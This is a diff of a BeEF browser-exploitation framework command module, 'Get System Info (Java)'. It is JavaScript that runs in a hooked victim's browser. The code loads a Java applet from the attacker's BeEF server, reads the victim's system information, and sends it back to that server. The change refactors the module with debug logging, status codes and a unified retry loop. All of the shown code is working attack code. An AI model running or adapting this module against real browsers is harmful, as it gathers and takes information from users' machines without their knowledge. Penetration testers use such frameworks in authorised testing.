@@ -6,39 +6,36 @@
 
 beef.execute(function() {
 
-	var internal_counter = 0;
-	var timeout = 30;
-	var output;
+  var internal_counter = 0;
+  var timeout = 30;
+  var output;
 
-	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, null);
+  beef.debug('[Get System Info (Java)] Loading getSystemInfo applet...');
+  beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, null);
 
-	if (beef.browser.isFF()) {
+  function waituntilok() {
+    beef.debug('[Get System Info (Java)] Executing getSystemInfo applet...');
 
-		output = document.getSystemInfo.getInfo();
-		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
-		beef.dom.detachApplet('getSystemInfo');
+    try {
+      output = document.getSystemInfo.getInfo();
+      if (output) {
+        beef.debug('[Get System Info (Java)] Retrieved system info: ' + output);
+         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"), beef.are.status_success());
+        beef.dom.detachApplet('getSystemInfo');
+        return;
+      }
+    } catch (e) {
+      internal_counter = internal_counter + 5;
+      if (internal_counter > timeout) {
+        beef.debug('[Get System Info (Java)] Timeout after ' + timeout + ' seconds');
+        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after ' + timeout + ' seconds', beef.are.status_error());
+        beef.dom.detachApplet('getSystemInfo');
+        return;
+      }
+      setTimeout(function() {waituntilok()}, 5000);
+    }
+  }
 
-	} else {
-
-		function waituntilok() {
-			try {
-				output = document.getSystemInfo.getInfo();
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
-				beef.dom.detachApplet('getSystemInfo');
-				return;
-			} catch (e) {
-				internal_counter++;
-				if (internal_counter > timeout) {
-					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after '+timeout+' seconds');
-					beef.dom.detachApplet('getSystemInfo');
-					return;
-				}
-				setTimeout(function() {waituntilok()},1000);
-			}
-		}
-
-		setTimeout(function() {waituntilok()},5000);
-
-	}
+  setTimeout(function() {waituntilok()}, 5000);
 });
 
